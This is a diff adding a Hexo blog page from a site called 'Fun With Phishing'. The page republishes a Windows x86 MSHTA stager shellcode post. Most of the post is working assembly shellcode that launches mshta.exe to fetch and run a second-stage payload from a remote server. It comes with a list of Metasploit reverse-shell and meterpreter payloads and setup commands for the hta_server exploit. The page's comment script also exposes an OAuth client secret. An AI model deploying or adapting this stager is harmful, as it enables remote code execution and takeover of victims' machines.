@@ -1,0 +1,483 @@
+
+
+  <!DOCTYPE html>
+  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
+  <style>
+    .text1
+    {
+    text-shadow: 0px 0px 2px #f2f3f2;
+    }
+    </style>
+
+  
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/null">
+  <link rel="icon" type="image/png" href="/null">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="FunPhishing">
+  <meta name="keywords" content="">
+  <title>Windows/x86 Stager Generic MSHTA Shellcode - Fun Phishing</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+    <body>
+      <header style="height: 70vh;">
+        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fun With Phishing</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+          <div class="banner" id="banner" false
+            style="background: url('/img/default.png') no-repeat center center;
+              background-size: cover;">
+              <div class="full-bg-img">
+                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+                  <div class="page-header text-center fade-in-up">
+                    <span class="h2 text1" id="subtitle" title="Windows/x86 Stager Generic MSHTA Shellcode">
+                      
+                        Windows/x86 Stager Generic MSHTA Shellcode
+                      
+                    </span>
+        
+                    
+                      <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-24 15:43" pubdate>
+        January 24, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      653 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+                    
+                  </div>
+                    
+                  </div>
+                  
+                </div>
+              </div>
+          </div>
+      </header>
+
+      <main>
+        
+          
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Windows/x86 Stager Generic MSHTA Shellcode</h1>
+            
+            <div class="markdown-body">
+              <h4 id="Windows-x86-Stager-Generic-MSHTA-Shellcode"><a href="#Windows-x86-Stager-Generic-MSHTA-Shellcode" class="headerlink" title="Windows/x86 Stager Generic MSHTA Shellcode"></a>Windows/x86 Stager Generic MSHTA Shellcode</h4><p>143 bytes small Windows/x86 stager generic MSHTA shellcode.</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Description: Windows x86 Shellcode that uses mshta.exe binary to execute a second stage payload delivered through metasploit&#x27;s hta_server exploit. This shellcode uses JMP/CALL/POP technic and static kernel32.dll functions addresses.</span></span><br><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#Metasploit compatible payload list:</span></span><br><br><span class="hljs-meta">#</span><span class="bash"> generic/custom</span><br><span class="hljs-meta">#</span><span class="bash"> generic/debug_trap</span><br><span class="hljs-meta">#</span><span class="bash"> generic/shell_bind_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> generic/shell_reverse_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> generic/tight_loop</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/bind_hidden_ipknock_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/bind_hidden_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/bind_ipv6_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/bind_ipv6_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/bind_named_pipe</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/bind_nonx_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/bind_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/bind_tcp_rc4</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/bind_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_hop_http</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_http</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_http_proxy_pstore</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_ipv6_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_nonx_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_ord_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_tcp_allports</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_tcp_dns</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_tcp_rc4</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_tcp_rc4_dns</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dllinject/reverse_winhttp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/dns_txt_query_exec</span><br><span class="hljs-meta">#</span><span class="bash"> windows/download_exec</span><br><span class="hljs-meta">#</span><span class="bash"> windows/<span class="hljs-built_in">exec</span></span><br><span class="hljs-meta">#</span><span class="bash"> windows/loadlibrary</span><br><span class="hljs-meta">#</span><span class="bash"> windows/messagebox</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/bind_hidden_ipknock_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/bind_hidden_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/bind_ipv6_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/bind_ipv6_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/bind_named_pipe</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/bind_nonx_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/bind_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/bind_tcp_rc4</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/bind_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_hop_http</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_http</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_http_proxy_pstore</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_https</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_https_proxy</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_ipv6_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_named_pipe</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_nonx_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_ord_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_tcp_allports</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_tcp_dns</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_tcp_rc4</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_tcp_rc4_dns</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_winhttp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/meterpreter/reverse_winhttps</span><br><span class="hljs-meta">#</span><span class="bash"> windows/metsvc_bind_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/metsvc_reverse_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/bind_hidden_ipknock_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/bind_hidden_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/bind_ipv6_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/bind_ipv6_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/bind_named_pipe</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/bind_nonx_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/bind_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/bind_tcp_rc4</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/bind_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/reverse_ipv6_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/reverse_nonx_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/reverse_ord_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/reverse_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/reverse_tcp_allports</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/reverse_tcp_dns</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/reverse_tcp_rc4</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/reverse_tcp_rc4_dns</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupdllinject/reverse_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/bind_hidden_ipknock_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/bind_hidden_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/bind_ipv6_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/bind_ipv6_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/bind_named_pipe</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/bind_nonx_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/bind_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/bind_tcp_rc4</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/bind_tcp_uuid</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/reverse_ipv6_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/reverse_nonx_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/reverse_ord_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/reverse_tcp</span><br><span class="hljs-meta">#</span><span class="bash"> windows/patchupmeterpreter/reverse_tcp_allports</span><br><br><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-string">&quot;hta_server&quot;</span> exploit payloads setting example:</span><br><br><span class="hljs-meta">#</span><span class="bash"> msf6 &gt; use exploit/windows/misc/hta_server (exploit <span class="hljs-keyword">for</span> second stage payload delivery)</span><br><span class="hljs-meta">#</span><span class="bash"> msf6 exploit(windows/misc/hta_server) &gt; <span class="hljs-built_in">set</span> payload windows/<span class="hljs-built_in">exec</span> (a payload from the previously specified list)</span><br><span class="hljs-meta">#</span><span class="bash"> msf6 exploit(windows/misc/hta_server) &gt; <span class="hljs-built_in">set</span> uripath 2NWyfQ9T.hta (a static value <span class="hljs-keyword">for</span> URIPATH)</span><br><span class="hljs-meta">#</span><span class="bash"> msf6 exploit(windows/misc/hta_server) &gt; <span class="hljs-built_in">set</span> CMD calc.exe (<span class="hljs-built_in">command</span> to be executed ex: calc.exe binary)</span><br><span class="hljs-meta">#</span><span class="bash"> msf6 exploit(windows/misc/hta_server) &gt; run  (second stage delivery server execution)</span><br><br><br><span class="hljs-meta">#</span><span class="bash"> Shellcode considerations:</span><br><br><span class="hljs-meta">#</span><span class="bash"> Function address of CreateProcessA <span class="hljs-keyword">in</span> kernel32.dll: 0x75732082</span><br><span class="hljs-meta">#</span><span class="bash"> Function address of ExitProcess <span class="hljs-keyword">in</span> kernel32.dll: 0x7578214f</span><br><span class="hljs-meta">#</span><span class="bash"> Size <span class="hljs-keyword">in</span> bytes of message db parameter, 65 bytes -&gt; 0x41 hex</span><br><span class="hljs-meta">#</span><span class="bash"> Message db contains a strings with the static path windows location of mshta.exe binary and the url obtained from hta_server exploit</span><br><br><br><span class="hljs-meta">#</span><span class="bash"> Assembly Shellcode:</span><br><br><br><br>global _start<br><br>section .text<br><br>_start:<br>  jmp application<br><br>firststep:<br>  pop edi<br>  xor eax, eax<br>  mov [edi+65], al    ; size in bytes of message db parameter<br><br>StartUpInfoANDProcessInformation:<br><br>  push eax      ; hStderror null in this case<br>  push eax      ; hStdOutput, null<br>  push eax      ; hStdInput, null<br>  xor ebx, ebx<br>  xor ecx, ecx<br>  add cl, 0x12      ; 18 times loop to fill both structures.<br><br>looper:<br>  push ebx<br>  loop looper<br><br>  ;mov word [esp+0x3c], 0x0101  ; dwflag arg in startupinfo<br>  mov bx, 0x1111<br>  sub bx, 0x1010    <br>  mov word [esp+0x3c], bx<br>  mov byte [esp+0x10], 0x44  ; cb=0x44<br>  lea eax, [esp+0x10]    ; eax points to StartUpInfo<br><br>          ; eax has a pointer to StartUPinfo<br>          ; esp has a pointer to Process_Info containing null values<br>createprocessA:<br>  push esp      ; pointer to Process-Info<br>  push eax      ; pointer to StartUpInfo<br>  xor ebx, ebx<br>  push ebx      ; null<br>  push ebx      ; null<br>  push ebx      ; null<br>  inc ebx<br>  push ebx      ; bInheritHandles=true<br>  dec ebx<br>  push ebx      ; null<br>  push ebx      ; null<br>  push edi      ; pointer to message db string<br>  push ebx      ; null<br>  mov edx, 0x75732082    ; CreateProcessA addr in kernel32.dll<br>  call edx<br><br>ExitProcess:<br>  push eax      ; createprocessA return in eax<br>  mov edx, 0x7578214f    ; ExitProcess addr in kernel32.dll<br>  call edx<br><br>application:<br>  call firststep<br>  message db &quot;c:\windows\system32\mshta.exe http://10.10.10.5:8080/2NWyfQ9T.hta&quot;<br></code></pre></div></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Shellcode/">Shellcode</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Shellcode/">Shellcode</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Windows/">Windows</a>
+                    
+                  </div>
+                
+              </div>
+              
+                
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/01/24/Backdoor-Win32-Hupigon-adef-Remote-Stack-Buffer-Overflow/">
+                        <span class="hidden-mobile">Backdoor.Win32.Hupigon.adef Remote Stack Buffer Overflow</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
+        var gitalk = new Gitalk({
+          clientID: '8080ccee553a4b56b170',
+          clientSecret: '57e093009366203e36c5f167f5c18b6b0027182d',
+          repo: 'chat',
+          owner: 'FunPhishing',
+          admin: ["FunPhishing"],
+          id: '92ed2a71f4488f673074aa93565c687b',
+          language: 'zh-CN',
+          labels: ["Gitalk"],
+          perPage: 10,
+          pagerDirection: 'last',
+          createIssueManually: true,
+          distractionFreeMode: false
+        });
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+            
+
+                
+                  <a id="scroll-top-button" href="#" role="button">
+                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+                  </a>
+                  
+
+                    
+                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+                        
+
+                          
+      </main>
+
+      <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="#" target="_blank" rel="nofollow noopener"><span>FunPhishing</span></a> <i class="iconfont icon-love"></i> <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+    </body>
+
+  </html>
